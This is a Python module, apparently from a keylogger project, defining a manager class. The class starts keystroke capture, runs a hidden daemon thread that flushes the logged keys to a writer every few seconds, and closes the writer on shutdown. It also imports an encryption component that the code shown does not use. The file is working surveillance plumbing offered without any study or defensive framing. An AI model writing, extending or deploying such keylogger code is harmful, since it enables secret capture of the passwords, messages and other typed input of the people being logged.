import threading
from typing import Optional
from .interfaces import IKeyLogger
from ..writers.interfaces import IWriter
from ..encryption.encryptor import Encryptor
import logging
import time

class KeyLoggerManager:
    def __init__(self, 
                 keylogger: IKeyLogger, 
                 writer: IWriter, 
                 buffer_size: int = 1024,
                 flush_interval: float = 5.0):
        self.keylogger = keylogger
        self.writer = writer
        self.buffer_size = buffer_size
        self.flush_interval = flush_interval
        
        self.running = False
        self.flush_thread: Optional[threading.Thread] = None
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)

    def start(self) -> None:
        """Start the keylogger and flush thread"""
        try:
            self.running = True
            
            # Start keylogger
            self.keylogger.start_logging()
            
            # Start flush thread
            self.flush_thread = threading.Thread(target=self._flush_loop)
            self.flush_thread.daemon = True
            self.flush_thread.start()
            
            self.logger.info("KeyLoggerManager started successfully")
            
        except Exception as e:
            self.running = False
            self.logger.error(f"Failed to start KeyLoggerManager: {e}")
            raise

    def stop(self) -> None:
        """Stop the keylogger and flush remaining data"""
        try:
            self.running = False
            
            # Stop keylogger
            self.keylogger.stop_logging()
            
            # Wait for flush thread to finish
            if self.flush_thread:
                self.flush_thread.join(timeout=5.0)
            
            # Final flush
            self._flush_buffer()
            
            # Close writer
            self.writer.close()
            
            self.logger.info("KeyLoggerManager stopped successfully")
            
        except Exception as e:
            self.logger.error(f"Error stopping KeyLoggerManager: {e}")
            raise

    def _flush_loop(self) -> None:
        """Periodically flush the key buffer"""
        while self.running:
            try:
                self._flush_buffer()
                time.sleep(self.flush_interval)
            except Exception as e:
                self.logger.error(f"Error in flush loop: {e}")

    def _flush_buffer(self) -> None:
        """Flush the current key buffer to the writer"""
        try:
            keys = self.keylogger.get_logged_keys()
            if keys:
                self.writer.write(keys)
                self.writer.flush()
        except Exception as e:
            self.logger.error(f"Error flushing buffer: {e}") 